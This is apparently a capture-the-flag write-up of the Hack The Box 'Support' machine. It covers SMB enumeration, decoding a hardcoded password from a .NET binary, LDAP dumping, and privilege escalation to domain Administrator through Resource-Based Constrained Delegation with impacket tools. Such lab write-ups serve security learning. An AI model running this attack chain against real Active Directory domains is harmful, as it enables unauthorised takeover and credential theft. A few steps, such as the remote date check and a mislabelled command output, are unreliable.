<div class="banner">
    <div class="ads">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6"><path stroke-linecap="round" stroke-linejoin="round" d="M12 12.75c1.148 0 2.278.08 3.383.237 1.037.146 1.866.966 1.866 2.013 0 3.728-2.35 6.75-5.25 6.75S6.75 18.728 6.75 15c0-1.046.83-1.867 1.866-2.013A24.204 24.204 0 0 1 12 12.75Zm0 0c2.883 0 5.647.508 8.207 1.44a23.91 23.91 0 0 1-1.152 6.06M12 12.75c-2.883 0-5.647.508-8.208 1.44.125 2.104.52 4.136 1.153 6.06M12 12.75a2.25 2.25 0 0 0 2.248-2.354M12 12.75a2.25 2.25 0 0 1-2.248-2.354M12 8.25c.995 0 1.971-.08 2.922-.236.403-.066.74-.358.795-.762a3.778 3.778 0 0 0-.399-2.25M12 8.25c-.995 0-1.97-.08-2.922-.236-.402-.066-.74-.358-.795-.762a3.734 3.734 0 0 1 .4-2.253M12 8.25a2.25 2.25 0 0 0-2.248 2.146M12 8.25a2.25 2.25 0 0 1 2.248 2.146M8.683 5a6.032 6.032 0 0 1-1.155-1.002c.07-.63.27-1.222.574-1.747m.581 2.749A3.75 3.75 0 0 1 15.318 5m0 0c.427-.283.815-.62 1.155-.999a4.471 4.471 0 0 0-.575-1.752M4.921 6a24.048 24.048 0 0 0-.392 3.314c1.668.546 3.416.914 5.223 1.082M19.08 6c.205 1.08.337 2.187.392 3.314a23.882 23.882 0 0 1-5.223 1.082" /></svg>
        Offensive Security
    </div>
    <h1>
        <span>Vishok - Hacking Pentesting</span>
        Support HTB Writeup
    </h1>
</div>

####
####
## Open ports in target machine
### Nmap
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3268/tcp  open  globalcatLDAP
9389/tcp  open  adws
49667/tcp open  unknown
49691/tcp open  unknown
```
####
How are many ports, is a little tedious insert one to one port in a new line to make a new scan to discover the services, so I use this approach to make easier the work:
####

```ruby
echo '
	53/tcp    open  domain
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3268/tcp  open  globalcatLDAP
	9389/tcp  open  adws
	49667/tcp open  unknown
	49691/tcp open  unknown
' | grep -oE '^([0-9]+)' | sed -z 's/\n/,/g'
```
####
- Grep and Sed Param
    - `-o` Make unique matches 
    - `-E` Find other results into a unique string 
    - `-z` Separate lines for each null character, is used to sustitute 
    - `s/` Especify the start of the sustitution 
    - `/g` Especify the end of the sustitution 
####
####
####
## Services that are running in the target machine
### Samba
Since the machine does not have *HTTP* type ports, we must list the services *(SMB, LDAP)* that are closing on the machine. Since we do not have credentials, we must do so using *Null Sessions*:
####
```bash
smbclient -L 10.10.11.174
```
####
- Smbclient
    - `-L` Specifies the host; it can be the domain associated with that IP or the IP itself
####
When running the previous command, we see `5` shared resources. Some are native and belong to a *(DC, Windows)*, but some are not, such as the resource: **support-tools**. This should not belong here, so it indicates that exploitation begins through this means.
####
We must list or view the content within that shared resource:
####
```bash
smbclient //10.10.11.174/support-tools
```
####
Once inside *SMB* it behaves differently than for example **telnet**, here if we do a *help* we can see that most of the commands to move within *SMB* are typical and basic commands from Windows and Linux terminals, which makes navigation easier. If we run `ls` to list the contents:
####

```ruby
7-ZipPortable_21.07.paf.exe A 2880728 Sat May 28 12:19:19 2022
npp.8.4.1.portable.x64.zip A 5439245 Sat May 28 12:19:55 2022
putty.exe A 1273576 Sat May 28 12:20:06 2022
SysinternalsSuite.zip A 48102161 Sat May 28 12:19:31 2022
UserInfo.exe.zip A 277499 Wed Jul 20 18:01:07 2022
windirstat1_1_2_setup.exe A 79171 Sat May 28 12:20:17 2022
WiresharkPortable64_3.6.5.paf.exe A 44398000 Sat May 28 12:19:43 2022
```
####
We see a series of files, but there's one that stands out: `UserInfo.exe.zip`. So we could take a look at it by downloading it using the command: `get <file_name>`. Once we've downloaded it, we unzip it and take a look at it.
####
####
####
## First explotation phase
##### Reversing
Neither file has any important information, which tells us that the information must be in the .exe. If the information is there, it indicates that this has the structure of a *reversing* like in a CTF. So if we start with the basics and read the strings from that executable:
####
```bash
strings UserInfo.exe | bat
```
####
We'll see methods like `get_password`, `enc_password`, which suggests that a user's password is being handled and hashed. If we dig deeper, we'll see something that looks like a password, or at least a hash of what a password could be.
####
But this isn't a real hash, so we need to perform a deeper analysis using disassembly tools. Since it's a Windows executable, we'll determine what type of file it is by running the following command:
####
```bash
file UserInfo.exe
```
####
This shows an output saying the file is a *PE32*, indicating that the file is executable built with **C#** or **.NET**. Therefore, to reverse a PE32 file built in C# or .NET, we need the **dnSpy** tool: [Download-DnSpy](https://github.com/dnSpy/dnSpy).
####
The problem is that we're using Linux, and this tool is also a PE32, a Windows executable. To run **.exe** files on Linux, we need the **wine** tool installed. Once inside the tool, we'll search for the functions we found earlier: `get_password`, `enc_password`. Since there aren't many functions, we find them very quickly.
####
<div class="info">

> The **dnSpy** tool only run over Windows operation system.
</div>

####
```cs
public static string getPassword() {
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++) {
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	
	return Encoding.Default.GetString(array2);
}

// Token: 0x04000005 RID: 5
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

// Token: 0x04000006 RID: 6
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```
####
We have the encoded password, a user, and the method that performs the password decoding. With this method, we could create a code in **C#** and perform the decoding, but in this case, we're going to use **Python**, converting the C# code to this language as is.
####
```python
#!/usr/bin.python3
import base64

def main():
    enc_password = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
    key = bytes("armando", "ascii")
    decode_password = base64.b64decode(enc_password)

    plain_text_password = bytearray()
    for x in range(len(decode_password)):
        plain_text_password.append(decode_password[x] ^ key[x % len(key)] ^ 0xDF)

    print(plain_text_password.decode('ascii'))

if __name__ == '__main__':
    main()
```
####
####
####
### LDAP
When we run it, we get a password, also when we do the search in **dnSpy** we saw a method that carried out an *LDAP* query, so I guess the user and password are for this service. Let's test it using **netexec**:
####
```bash
netexec ldap 10.10.11.174 -u armando -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
```
####
- Netexec Param
    - `ldap` Specifies the service to test; there are others such as *(winrm, smb)*
    - `-u` Specifies the user
    - `-p` Specifies the password
####
After running this, netexec confirms that the user armando with that password is a valid domain-level user, so we could perform an LDAP-based enumeration with the **ldapdomaindump** tool.
####
```bash
ldapdomaindump -u armando -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```
####
- Ldapdomaindump Param
    - `-u` Specify the user
    - `-p` Specify the password
    - `dc.support.htb` Domain to dump
####
This will dump a bunch of things, such as domain-level users, groups, etc., in different formats, such as json, html, and txt. The most interesting are the users because passwords are sometimes exposed in these files, so let's start by reading the users file. We find that the **support** user has what appears to be a password in a field called info.
####
```bash
"info": [
	"Ironside47pleasure40Watchful"
]
```
####
Since we previously used **netexec** to verify if the user armando had domain-level privileges for the LDAP service, how about checking if the user `support` is valid for domain authentication with *winrm*?
####
```bash
netexec winrm 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```
####
- Netexec Param
    - `winrm` Specifies the service to test; there are others such as *(ldap, smb)*
    - `-u` Specifies the user
    - `-p` Specifies the password
####
As we can see, we have `Pwn3d!`, which indicates that we will be able to gain access to the machine using **evil-winrm** with these credentials.
####
####
####
## Second exploit phase (Privilage Escalation)
### RBCD
Searching for a way to elevate my privileges, I discovered that the user `support` has the `WriteProperty` permission and can also control *SPN* accounts. This occurs primarily in Active Directory and is known as RBCD *(Resource-Based Constrained Delegation)*.
####
<div class="info">

> RBCD (Resource-Based Constrained Delegation) is an exploitation technique in Active Directory environments that allows users to abuse the delegation of permissions to escalate privileges.
</div>

####
The process is found in many articles, blogs, and writeups that use `PowerView.ps1`, `Powermad.ps1`, and `Rubeus`.exe, but there is a suite called **Impacket** that can accomplish all of this:
####
```bash
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -computer-name 'vishok' -computer-pass 'vishok'
```
####
- Impacket-addcomputer Param
    - `-computer-name` Sets the name of the new machine within the *DC*
    - `computer-pass` Sets the password for that new machine
####
```bash
impacket-rbcd -delegate-from 'vishok$' -delegate-to 'DC$' -dc-ip 10.10.11.174 -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```
####
- Impacket-rbcd Param
    - `-delegate-from` Indicates the name of the source machine
    - `-delegate-to` Indicates the name of the destination machine to impersonate
    - `-dc-ip` Indicates the IP of the *DC*
    - `-action` Indicates the action to be performed within **msDS-AllowedToActOnBehalfOfOtherIdentity**
####
We only have one more command to use from Impacket, but authentication against the machine is with **Kerberos**, and there's a problem related to this. In Kerberos, synchronizing the date between the local and remote machines is very important. If we try to obtain the ticket in `ccache` format:
####
```ruby
impacket-getST -spn 'host/dc.support.htb' -impersonate Administrator -dc-ip 10.10.11.174 'support.htb/vishok$:vishok'
    Result ->
        [-] CChache file is not found. Skipping...
        [*] Getting TGT for user
        Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew to great)
```
####
- Impacket-getST Param
    - `-spn` Specifies the Service Principal Name (e.g., host/dc.support.htb)
    - `-impersonate` Specifies the user to impersonate (e.g., Administrator)
    - `-dc-ip` IP address of the Domain Controller
####
<div class="info">

> The credentials `Domain\Username:Password` format is used to authenticate and request the service ticket.
</div>

####
The error message: *(Clock skew too great)* prevents us from proceeding. I found a good way to bypass Kerberos and prevent it from performing a date check against the DC. The **faketime** tool will help us in this case. The first thing to do is get the current date of the DC and then pass it to the tool:
####
```Ruby
date 10.10.11.174
    Result ->
        Saturday, Abril 19, 2025 9:24:36 PM
```
####
It works like a charm, but it's only possible to use it on the same line. If you use *pipes* after inserting the **faketime**, it won't work. What's left is to export the generated ticket as an environment variable, and finally.
####
```bash
export KRB5CCNAME=Administrator.ccache`
```
####
Then
####
```ruby
KRB5CCNAME=Administrator.ccache faketime "2025-04-19 21:30:08" impacket-smbexec -dc-ip 10.10.11.174 -no-pass -k support.htb/administrator@dc.support.htb
    Result -> 
        [-] CChache file is not found. Skipping...
        [+] Getting TGT for user
        [+] Impersonating Administrator
        [+]     Requesting S4U2self
        [+]     Requesting S4U2proxy
        [+] Saving ticket in Administrator.ccache
```
####
<div class="warning">

>  The fake date must always come before **impacket** and without pipes. If you do this, we can bypass Kerberos verification with the date and gain access to the machine.
</div>

####
<div class="info">

> When we connect with **smbexec**, we need to use 100% Windows commands and absolute paths, always using `C:`.
</div>